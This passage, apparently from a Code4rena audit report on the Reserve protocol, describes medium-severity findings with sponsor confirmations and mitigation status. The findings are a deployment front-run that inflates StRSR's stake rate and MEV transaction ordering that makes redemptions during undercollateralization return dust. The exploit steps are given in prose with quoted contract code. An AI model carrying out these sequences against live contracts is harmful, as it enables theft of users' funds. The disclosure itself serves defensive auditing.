class=\"grvsc-line\"><span class=\"grvsc-source\">        emit ExchangeRateSet(initRate, exchangeRate());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see it sets the value of the <code>stakeRate</code>  to <code>(totalStakes * FIX_ONE_256 + (stakeRSR - 1)) / stakeRSR</code>.</p>\n<p>So to exploit this attacker needs to perform these steps:</p>\n<ol>\n<li>send <code>200 * 1e18</code> RSR tokens (18 is the precision) to the StRSR address before its deployment by watching mempool and front running. the deployment address is calculable before deployment.</li>\n<li>function <code>init()</code> would get executed and would set <code>200 * 1e18</code> as <code>rsrRewardsAtLastPayout</code>.</li>\n<li>then attacker would call <code>stake()</code> and stake 1 RSR token (1 wei) in the contract and the value of <code>stakeRSR</code> and <code>totalStakes</code> would be 1.</li>\n<li>then attacker wait for <code>rewardPeriod</code> seconds and then call <code>payoutReward()</code> and code would pay rewards based on <code>rewardRatio</code> and <code>rsrRewardsAtLastPayout</code> and as <code>rewardRatio</code> is higher than 1% (default and normal mode) code would increase <code>stakeRate</code> more than <code>2 * 1e18</code> amount. and then code would set <code>stakeRate</code> as <code>totalStakes * FIX_ONE_256 + (stakeRSR - 1)) / stakeRSR = 1</code>.</li>\n<li>then calls to <code>stake()</code> would cause users to lose up to <code>1e18</code> RSR tokens as code calculates stake amount as <code>newTotalStakes = (stakeRate * newStakeRSR) / FIX_ONE</code> and rounding error happens up to <code>FIX_ONE</code>. because the calculated stake amount is worth less than deposited rsr amount up to <code>1e18</code>.</li>\n<li>attacker can still users funds by unstaking 1 token and receiving <code>1e18</code> RSR tokens. because of the rounding error in <code>unstake()</code></li>\n</ol>\n<p>so attacker can manipulate the <code>stakeRate</code> in contract deployment time with sandwich attack which can cause other users to lose funds because of the big rounding error.</p>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Prevent early manipulation of the PPS.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/439\">tbrent (Reserve) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/439#issuecomment-1421600557\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>Addressed in <a href=\"https://github.com/reserve-protocol/protocol/pull/617\">https://github.com/reserve-protocol/protocol/pull/617</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed with comments. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/51\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/20\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/27\">AkshaySrivastav</a>.</p>\n<hr>\n<h2 id=\"m-03-baited-by-redemption-during-undercollateralization-no-issuance-just-transfer\" style=\"position:relative;\"><a href=\"#m-03-baited-by-redemption-during-undercollateralization-no-issuance-just-transfer\" aria-label=\"m 03 baited by redemption during undercollateralization no issuance just transfer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/416\">[M-03] Baited by redemption during undercollateralization (no issuance, just transfer)</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/416\">Cyfrin</a></em></p>\n<p>This is similar to the “high” vulnerability I submitted, but also shows a similar exploit can be done if a user isn’t a whale, and isn’t issuing anything.</p>\n<p>A user can send a redeem TX and an evil actor can make it so they get almost nothing back during recollateralization. This requires ordering transactions, or just getting very unlucky with the order of your transaction.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>UserA is looking to redeem their rToken for tokenA (the max the battery will allow, let’s say 100k)</li>\n<li>A basket refresh is about to be triggered</li>\n<li>Evil user wants the protocol to steal UserA’s funds</li>\n<li>UserA sends redeem TX to the mempool, but Evil user move transactions around before it hits</li>\n<li>Evil user calls refreshbasket in same block as original collateral (tokenA) is disabled, kicking in backupconfig (tokenB)</li>\n<li>Protocol is now undercollateralized but collateral is sound (tokenB is good)</li>\n<li>Evil sends 1tokenB to backingManager to UserA’s redeem has something to redeem</li>\n<li>UserA’s redemption tx lands, and redeems 100k rTokens for a fraction of tokenB!</li>\n</ul>\n<p>UserA redeems and has nothing to show for it!</p>\n<p>Evil user only had to buy 1 tokenB (or even less) to steal 100k of their rToken.</p>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Hardhat</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Disallow redemptions/issuance during undercollateralization</p>\n<h3 id=\"proof-of-code\" style=\"position:relative;\"><a href=\"#proof-of-code\" aria-label=\"proof of code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Code</h3>\n<p>See warden’s <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/416\">original submission</a> for full details.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/416#issuecomment-1402220739\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Not sure this is distinct enough from the other attack vector to stand alone, leaving open for sponsor comment before duping.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/416#issuecomment-1405419594\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>Duplicate of <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/399\"><code>#399</code></a> </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/416#issuecomment-1419296557\">tbrent (Reserve) confirmed</a></strong></p>\n<p><strong><em>Please note: the following comment and re-assessment took place after judging and awarding were finalized. As such, this report will leave this finding in its originally assessed risk category as it simply reflects a snapshot in time.</em></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/416#issuecomment-1428777177\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>After re-reviewing, I do believe this should have been included in the <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/399\">M-04</a> batch of issues as well.  As it is past the QA period, no changes will be made to awards, but I wanted to comment as such for the benefit of the sponsor.</p>\n</blockquote>\n<p><em>Note: see mitigation status under M-04 below.</em></p>\n<hr>\n<h2 id=\"m-04-redemptions-during-undercollateralization-can-be-hot-swapped-to-steal-all-funds\" style=\"position:relative;\"><a href=\"#m-04-redemptions-during-undercollateralization-can-be-hot-swapped-to-steal-all-funds\" aria-label=\"m 04 redemptions during undercollateralization can be hot swapped to steal all funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/399\">[M-04] Redemptions during undercollateralization can be hot-swapped to steal all funds</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/399\">Cyfrin</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/411\">Cyfrin</a></em></p>\n<p>During recollateralization/a switch basket/when the protocol collateral isn’t sound, a user can have almost their entire redemption transaction hot swapped for nothing.</p>\n<p>For example, trying to redeem 1M collateral for 1M rTokens could have the user end up with 0 collateral and 0 rTokens, just by calling the <code>redeem</code> function at the wrong time.</p>\n<p>Example:</p>\n<ul>\n<li>User A issues 1M rToken for 1M tokenA</li>\n<li>Evil user sees tokenA is about to become disabled, and that User A sent a normally innocuous redeem tx for too much underlying collateral in the mempool</li>\n<li>Evil user orders transactions so they and RSR/Rtoken holders can steal user A’s funds</li>\n<li>They first buy a ton of tokenA and send it to the backing Manager</li>\n<li>They call <code>manageTokens</code> which flash issues a ton of new Rtoken due to the inflated tokenA balance, increasing the totalSupply</li>\n<li>The increase in total supply allows the normal redemption cap to be drastically lifted</li>\n<li>They then let the disabling of tokenA process, and calls refreshBasket where a backup token (tokenB) kicks in</li>\n<li>We are now undercollateralized, and evil user sends tokenB dust to the backingmanager</li>\n<li>FINALLY: the original redemption TX is ordered, and due to the inflated RToken supply, the battery discharge amount is also inflated, allowing the redemption to go through. Due to the new collateral in place, they redeem ALL their Rtoken (1M) for dust of tokenB!! The protocol has essentially honeypotted them!!</li>\n</ul>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>We provide the proof of code in <code>proof of code</code> section.</p>\n<ol>\n<li>MEV</li>\n</ol>\n<p>This relies on a validator being malicious with for-profit motives. It would be pretty easy for them to setup a bot looking for this exact scenario though and just staying dormant till the time is right. If they get to order the transactions, they can make a fat profit from the victim.</p>\n<ol start=\"2\">\n<li>Backing manager can flash issue RToken</li>\n</ol>\n<p>If the backingManger has too many excess assets, it will flash issue as <a href=\"https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/BackingManager.sol#L201\">many RTokens as</a> possible to even the collateral to RTokens.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function handoutExcessAssets(IERC20[] calldata erc20s) private {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">if (held.gt(needed)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">rToken.mint(address(this), uint256(rTok));</span></span></code></pre>\n<ol start=\"3\">\n<li>Increasing the supply increases the redemption and issuance block cap</li>\n</ol>\n<p>The RedemptionBattery’s currentCharge function is <a href=\"https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/libraries/RedemptionBattery.sol#L59\">dependent on the total supply of RTokens</a>. So if the total supply is raised, you can redeem way more than you should be able to.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 amtPerHour = (supply * battery.scalingRedemptionRate) / FIX_ONE_256;</span></span></code></pre>\n<p>(This also is true for issuance.)</p>\n<ol start=\"4\">\n<li>Anyone can call <a href=\"https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/BasketHandler.sol#L179\">refreshBasket when a collateral</a> is disabled</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function refreshBasket() external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            assetRegistry.refresh();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                main.hasRole(OWNER, _msgSender()) ||</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    (status() == CollateralStatus.DISABLED &amp;&amp; !main.pausedOrFrozen()),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                &quot;basket unrefreshable&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _switchBasket();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span></code></pre>\n<p>So if I see a tx where a collateral is about to be disabled, I can chain it with the refreshbasket TX myself.</p>\n<ol start=\"5\">\n<li>Redemptions can occur when protocol is undercollateralized</li>\n</ol>\n<p>The <code>redeem</code> function has this check:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">require(basketHandler.status() != CollateralStatus.DISABLED, &quot;collateral default&quot;);</span></span></code></pre>\n<p>Which checks if the collateral is good, but NOT if the protocol is fullyCollateralized. Since we chain the disabled asset with the refreshBasket TX, the backup collateral kicks in, and the collateral status becomes <code>SOUND</code>. However, normally, we’d have 0 of the new collateral and any redemptions would fail, since there isn’t anything to give back.</p>\n<ol start=\"6\">\n<li>Sending dust to backing manager</li>\n</ol>\n<p>So, if you send a tiny tiny bit of the new collateral to the protocol, the protocol will process the redemption and give them their <code>prorata</code> share of the collateral, which right now is almost 0, but still burn all the rToken being redeemed.</p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/RToken.sol#L475\">RToken.sol</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// amount is never changed, they burn all the rToken</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// in our example above, all 1M Rtoken are burned!</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">_burn(redeemer, amount);</span></span></code></pre>\n<p>And we calculate how much they get back like so. We see how much <code>$</code> we currently have in the basket, and hand back those amounts accordingly. Since we have almost no money, we are going to give them almost nothing for their rTokens.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">(address[] memory erc20s, uint256[] memory amounts) = basketHandler.quote(baskets, FLOOR);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 erc20length = erc20s.length;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// Bound each withdrawal by the prorata share, in case we&#39;re currently under-collateralized</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint256 i = 0; i &lt; erc20length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // {qTok}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256 bal = IERC20Upgradeable(erc20s[i]).balanceOf(address(backingManager));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // gas-optimization: only do the full mulDiv256 if prorate is 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256 prorata = (prorate &gt; 0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                ? (prorate * bal) / FIX_ONE // {qTok} = D18{1} * {qTok} / D18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                : mulDiv256(bal, amount, supply); // {qTok} = {qTok} * {qRTok} / {qRTok}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (prorata &lt; amounts[i]) amounts[i] = prorata;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span></code></pre>\n<p>And just like that, a seemingly innocuous redemption transaction was a trap the whole time. The next step would be to go through the rest of the process to see how much our evil user profited (from running the auctions), as they need to be a whale to inflate the RToken supply. However, we’ve seen attacks like this, and one could consider it a <a href=\"https://twitter.com/avi_eisen/status/1581326197241180160?s=20&#x26;t=8WpEg76bW_Kk8YaJ5orP5Q\">highly profitable trading strategy</a>. If they buy up majority shares in the RToken, or, they coordinate with most of the StRSR token holders they could advertise and honey pot people to do redemptions whenever a switchBasket is coming. Spread FUD like “you need to redeem otherwise you’ll lose money!” and it’s the redeeming that actually steals their money.</p>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Hardhat</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Disallow issuance/redemptions while the protocol is undercollateralized.</p>\n<h3 id=\"proof-of-code-1\" style=\"position:relative;\"><a href=\"#proof-of-code-1\" aria-label=\"proof of code 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Code</h3>\n<p>See warden’s <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/399\">original submission</a> for full details.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/399#issuecomment-1399349370\">0xean (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Certainly a creative attack vector, will leave open for sponsor review.  I am unclear on a few nuances of the attack here, but ultimately would like the sponsor to comment.</p>\n<p>Downgrading to Medium for the moment due to a very particular sequence of events being required for this to be executed. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/399#issuecomment-1405418612\">tbrent (Reserve) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>The bug is simpler than the description. If the basket is DISABLED, then all that needs to happen is for a redeem tx to be in the mempool. An MEV searcher can order a <code>refreshBasket()</code> call earlier in the block, causing the redemption to be partial. This acts as a net transfer between the RToken redeemer and RSR stakers, who will eventually collect the money. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed\">tbrent (Reserve) mitigated</a>:</strong></p>\n<blockquote>\n<p>This PR allows an RToken redeemer to specify when they require full redemptions vs accept partial (prorata) redemptions.<br>\n<a href=\"https://github.com/reserve-protocol/protocol/pull/615\">reserve-protocol/protocol#615</a></p>\n</blockquote>\n<p><strong>Status:</strong> Not fully mitigated. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/54\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/14\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/69\">AkshaySrivastav</a>. Also included in Mitigation Review section below.</p>\n<hr>\n<h2 id=\"m-05-early-user-can-call-issue-and-then-melt-to-increase-basketsneeded-to-supply-ratio-to-its-maximum-value-and-then-melt-wont-work-and-contract-features-like-issue-wont-work\" style=\"position:relative;\"><a href=\"#m-05-early-user-can-call-issue-and-then-melt-to-increase-basketsneeded-to-supply-ratio-to-its-maximum-value-and-then-melt-wont-work-and-contract-features-like-issue-wont-work\" aria-label=\"m 05 early user can call issue and then melt to increase basketsneeded to supply ratio to its maximum value and then melt wont work and contract features like issue wont work permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/384\">[M-05] Early user can call <code>issue()</code> and then <code>melt()</code> to increase <code>basketsNeeded</code> to supply ratio to its maximum value and then <code>melt()</code> won’t work and contract features like <code>issue()</code> won’t work</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/384\">unforgiven</a></em></p>\n<p><a 